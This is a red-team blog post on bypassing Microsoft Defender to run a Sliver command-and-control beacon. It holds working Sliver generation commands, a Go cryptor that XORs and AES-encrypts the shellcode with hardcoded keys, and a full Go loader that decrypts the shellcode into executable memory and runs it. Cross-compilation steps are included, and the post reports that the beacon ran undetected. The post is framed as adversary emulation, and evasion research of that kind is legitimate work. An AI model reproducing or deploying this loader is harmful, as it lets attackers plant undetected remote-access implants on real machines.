---
title: "Bypassing Defender to run Sliver"
layout: "post"
categories: "Windows"
tags: ["Red Team"]
---

Hey all, back with another blog, this time focusing more on red team concepts. I want to highlight that the code/concepts covered in this blog are for educational purposes and not to be used in a malicious manner.

Recently, I have been delving into adversary emulation and noticed an increasing number of blogs suggesting that adversaries are shifting away from well-known tools like Cobalt Strike to less recognized C2s such as Sliver. This shift is partly due to the growing number of flagged signatures for Cobalt Strike and Metasploit. Microsoft researchers have also released a blog documenting how nation-state threat actors have transitioned to Sliver, as detailed here: [https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/](https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/).

Given all the new attention, I wanted to investigate if the signatures have been flagged. To test this, we will generate a Sliver executable and transfer it to the Windows machine.\

```bash
/opt/sliver/sliver-server_linux

generate beacon -f exe -m 10.10.10.10
```

![](/assets/posts/2023-12-10-bypassing-defender-to-run-sliver/generate_sliver.bmp)

Next, we attempt to transfer the binary to our Windows machine. However, the moment it touches the disk, Defender flags the signature as Sliver.

![](/assets/posts/2023-12-10-bypassing-defender-to-run-sliver/sliver_caught.bmp)

Now, we can attempt to use a common technique to bypass AV, which involves using a cryptor. The same techniques that developers use to secure information from attackers can be applied to bypass AV/EDR. For this blog, we will XOR the shellcode and then run it through AES encryption, opting for PKCS#5 padding. Although you can use PKCS#7 padding if you prefer. The initial step is to generate shellcode with Sliver.

```bash
generate beacon -f shellcode -m 10.10.10.10
```

![](/assets/posts/2023-12-10-bypassing-defender-to-run-sliver/sliver_generate_shellcode.bmp)

When examining the size of the .bin file that Sliver generates, we noticed it is quite large. This poses a challenge, as it rules out, in my opinion, two common techniques: process injection and process hollowing. Traditionally, both of these processes involve injecting code into an already running process. Attempting to allocate and write 16MB of data into an already running legitimate process is undoubtedly risky.

To overcome this challenge, I've chosen a method involving code injection into the current process that runs when executing the binary. While allocating and writing 16MB of data is a substantial amount, the concept of processes allocating and writing new memory in large amounts is not uncommon. Therefore, I believe this is the safest method to use, providing some stability.\
\
For this blog, I will be writing my code in Go and cross-compiling for Windows. Although Go is statically compiled, resulting in larger binaries, it adds a layer of obscurity because it isn't native to the Windows OS. To kick off the process, we need to install Golang on our machine.

``` bash
# Install Golang 
wget go1.21.4.linux-amd64.tar.gz
sudo tar -C /usr/local -xvf go1.21.4.linux-amd64.tar.gz
sudo nano ~/.profile
export PATH=$PATH:/usr/local/go/bin
source ~/.profile

# Setup Golang Environment 
go env -w GO111MODULE=auto

# From within source directory 
go mod init main
go mod tidy
```

Now, we can write a cryptor program that will read in the binary data and perform XOR and AES encryption operations on the data. Subsequently, it will print the data in a formatted byte slice that will be used in our loader.

``` go
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"io/ioutil"
)

const (
	xorKey = "HelpMeWinlezPlz?"
	aesKey = "SupeRSecrET145*$"
)

func pkcs5Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func aesEncrypt(originalData, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	blockSize := block.BlockSize()

	originalData = pkcs5Padding(originalData, blockSize)

	blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])

	crypted := make([]byte, len(originalData))

	blockMode.CryptBlocks(crypted, originalData)

	return crypted, nil
}

func printFormattedByteSlice(slice []byte) {
	fmt.Print("byteSlice := []byte{")
	for i, b := range slice {
		fmt.Printf("%d", b)
		if i < len(slice)-1 {
			fmt.Print(",")
		}
	}
	fmt.Println("}")
}

func main() {
	// Read content binary file
	fileContent, err := ioutil.ReadFile("FAR_LIVESTOCK.bin")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	// XOR
	xoredData := make([]byte, len(fileContent))
	for i := range fileContent {
		xoredData[i] = fileContent[i] ^ xorKey[i%len(xorKey)]
	}

	// AES encryption
	encryptedData, err := aesEncrypt(xoredData, []byte(aesKey))
	if err != nil {
		fmt.Println("Error encrypting data:", err)
		return
	}

	// Print formatted byte slice
	printFormattedByteSlice(encryptedData)
}

```

```bash
GOOS=linux GOARCH=amd64 go build shellcode_cryptor.go
```

![](/assets/posts/2023-12-10-bypassing-defender-to-run-sliver/shellcode_encrypt.bmp)

After running the encryptor program, we redirect the byte slice output to a file due to its size, which could fill up the terminal. I recommend downloading Sublime for the next portion, as it handles editing files with large amounts of data best, in my opinion.

Now that we have encrypted shellcode, we will create a decrypter program to validate that the binary data is the same as before encryption. Copy the byte slice saved in the `sliver_payload` file to the new Go program below.

``` go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"io/ioutil"
)

var xorKey string
var aesKey string

func main() {

	// Encrypted data from sliver_payload
	byteSlice := []byte{}

	// AES decryption
	aesDecrypted, _ := aesDecrypt(byteArray, []byte(aesKey))

	// XOR decryption
	xoredData := make([]byte, len(aesDecrypted))
	for i := range aesDecrypted {
		xoredData[i] = aesDecrypted[i] ^ xorKey[i%len(xorKey)]
	}

	// Write xoredData to a binary file
	err := ioutil.WriteFile("sliver_data.bin", xoredData, 0755)
	if err != nil {
		fmt.Println("Error writing xored data to file:", err)
		return
	}

}

func pkcs5UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

func aesDecrypt(crypted, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	blockSize := block.BlockSize()
	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])

	originalData := make([]byte, len(crypted))
	blockMode.CryptBlocks(originalData, crypted)

	originalData = pkcs5UnPadding(originalData)
	return originalData, nil
}

```

When attempting to compile the code, I encountered issues with my VM killing the process. To overcome this, I distributed the work across 8 CPUs and increased the resources that my shell session could utilize. Additionally, I employed build-time variable substitution to pass the values of `xorKey` and `aesKey` variables during the compilation process. These values are embedded in the binary at build time, and the variables are initialized with those values when the program starts.

```bash
# Increase open file limit
ulimit -n 8192

# Increase stack size
ulimit -s unlimited

# Increase locked-in-memory size
ulimit -l unlimited

mkdir build 
cd build 
go build -p 8 --ldflags "-X main.xorKey=HelpMeWinlezPlz? -X main.aesKey=SupeRSecrET145*$" decryption_checker.go

diff sliver_data.bin ../FAR_LIVESTOCK.bin

du -sh sliver_data.bin
```

![](/assets/posts/2023-12-10-bypassing-defender-to-run-sliver/sliver_decrypt_verify.bmp)

After executing the decryptor program, we compare the binary data after decryption with the original Sliver binary data, and they are an exact match. Now, we are finally ready to build the loader for our beacon. Our `loader.go` file will contain the same logic to decrypt the binary data back into Sliver shellcode but will also add a few more steps. We will save the shellcode into a byte slice, allocate a block of virtual memory in the current process, write the shellcode to that memory, and then jump to and execute it.&#x20;

```go
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
)

var xorKey string
var aesKey string

func main() {

	// Encrypted data from sliver_payload
	byteSlice := []byte{//encrypted bytes go here}
		
	// AES decryption
	aesDecrypted, _ := aesDecrypt(byteSlice, []byte(aesKey))

	// XOR decryption
	xoredData := make([]byte, len(aesDecrypted))
	for i := range aesDecrypted {
		xoredData[i] = aesDecrypted[i] ^ xorKey[i%len(xorKey)]
	}

	// Execute the decrypted code
	doWork(xoredData)
}

func pkcs5UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

func aesDecrypt(crypted, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	blockSize := block.BlockSize()
	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])

	originalData := make([]byte, len(crypted))
	blockMode.CryptBlocks(originalData, crypted)

	originalData = pkcs5UnPadding(originalData)
	return originalData, nil
}

func doWork(something []byte) {

	// Allocate memory for the code
	mem, err := windows.VirtualAlloc(0, uintptr(len(something)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		fmt.Println("VirtualAlloc failed with error:", err)
		panic("call to VirtualAlloc failed!")
	}

	// Write the code to the allocated memory
	var nBytesWritten uintptr
	success := windows.WriteProcessMemory(windows.CurrentProcess(), mem, &something[0], uintptr(len(something)), &nBytesWritten)
	if success != nil {
		fmt.Println("WriteProcessMemory failed with error:", success)
		panic("call to WriteProcessMemory failed!")
	}

	// Execute the code
	syscall.Syscall(mem, 0, 0, 0, 0)
}

```

```bash
go mod init main 
go get golang.org/x/sys/windows
go mod tidy

GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -p 8 --ldflags "-X main.xorKey=HelpMeWinlezPlz? -X main.aesKey=SupeRSecrET145*$" -o test.exe loader.go

```

![](/assets/posts/2023-12-10-bypassing-defender-to-run-sliver/sliver_loader.bmp)

Compiling `loader.go` was successful, and the final step is to transfer the binary to our Windows machine and run it.

![](/assets/posts/2023-12-10-bypassing-defender-to-run-sliver/sliver_run.bmp)

![](/assets/posts/2023-12-10-bypassing-defender-to-run-sliver/sliver_defender_on.bmp)

Success! We were able to run Sliver and get a beacon without Defender picking it up. Our binary was also able to be executed from disk. I hope this blog highlighted how to use a cryptor to evade detection.

With adversaries moving to Sliver and other open-source C2 solutions, it is crucial to build out techniques that facilitate running these tools in secure environments. When performing adversary emulation, you can't simply turn off the AV/EDR because the tool is getting flagged. While building your own stager from scratch is the best method, that isn't the point of emulation. If your threat intelligence indicates that the APT is using Sliver, then you need to figure out how to get Sliver to work again during your engagement.

As always, I appreciate everyone taking the time to read this blog!
